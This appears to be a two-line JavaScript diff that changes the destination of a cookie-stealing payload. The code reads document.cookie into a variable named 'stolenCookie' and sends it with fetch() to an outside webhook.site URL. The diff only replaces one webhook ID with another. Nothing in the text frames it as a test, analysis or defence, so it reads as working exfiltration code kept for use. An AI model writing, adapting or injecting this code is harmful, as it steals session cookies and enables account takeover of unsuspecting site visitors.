@@ -1,2 +1,2 @@
 const stolenCookie = document.cookie;
-fetch('https://webhook.site/1293cb30-e705-48fe-b307-5790d46650f3?data=' + encodeURIComponent(stolenCookie));
+fetch('https://webhook.site/6813c3fc-ca54-4c0a-9cf1-ef3afe966825?data=' + encodeURIComponent(stolenCookie));
